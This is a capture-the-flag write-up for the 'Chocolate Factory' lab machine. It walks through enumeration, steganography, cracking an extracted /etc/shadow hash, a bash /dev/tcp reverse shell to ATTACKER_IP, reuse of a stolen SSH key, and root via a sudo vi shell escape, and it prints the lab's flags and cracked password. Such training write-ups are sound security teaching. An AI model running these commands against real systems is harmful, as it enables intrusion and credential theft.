Chocolate Factory – CTF Writeup

Overview

This machine follows a multi-layered attack chain involving enumeration, steganography, cryptography, credential extraction, and privilege escalation.

⸻

1. Initial Enumeration

Port Scan

RustScan/Nmap revealed:
	•	21 (FTP)
	•	22 (SSH)
	•	80 (HTTP)
	•	100–125 (multiple unusual ports)

Observation:
	•	Ports 100–125 returned identical responses → distraction
	•	Key hint discovered on port 113:
/key_rev_key

⸻

2. FTP Enumeration

Anonymous login allowed:

ftp 10.x.x.x

File found:
	•	gum_room.jpg

⸻

3. Steganography

Check image:

steghide info gum_room.jpg

Result:
	•	Embedded file: b64.txt
	•	Encrypted with AES (Rijndael-128)

⸻

4. Key Discovery

From web endpoint:

http://TARGET/key_rev_key

Key obtained:

VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=

Important:
	•	This is a passphrase, not meant to be decoded

⸻

5. Extract Hidden Data

steghide extract -sf gum_room.jpg

Use key as passphrase → extract b64.txt

⸻

6. Decode Base64

cat b64.txt | base64 -d

Output:
	•	/etc/shadow entry for user charlie

⸻

7. Crack Password

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Result:

charlie:cn7824


⸻

8. Web Access → RCE

Login to web panel using:
	•	Username: charlie
	•	Password: cn7824

Gain command execution → spawn reverse shell:

bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'


⸻

9. Reverse Shell → Enumeration

User: www-data

Explore system → found in /home/charlie:
	•	teleport (private SSH key)

⸻

10. SSH Pivot

Copy key locally:

chmod 600 id_rsa
ssh -i id_rsa charlie@TARGET


⸻

11. User Flag

cat ~/user.txt

flag{cd5509042371b34e4826e4838b522d2e}


⸻

12. Privilege Escalation

Check sudo:

sudo -l

Result:
	•	vi allowed as root

Exploit:

sudo vi
:set shell=/bin/bash
:shell

Now root shell obtained

⸻

13. Root Flag

Found script root.py requiring Fernet key

Run with Python3 and same key:

python3 root.py

Key:

VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=

Output:

flag{cec59161d338fef787fcb4e296b42124}


⸻

Final Flags
	•	User: flag{cd5509042371b34e4826e4838b522d2e}
	•	Root: flag{cec59161d338fef787fcb4e296b42124}

⸻

Key Takeaways
	•	Ignore noisy ports; focus on hints
	•	Steganography often hides critical data
	•	Not all Base64 strings are meant to be decoded
	•	Always check for readable SSH keys
	•	GTFOBins is essential for privilege escalation

⸻

End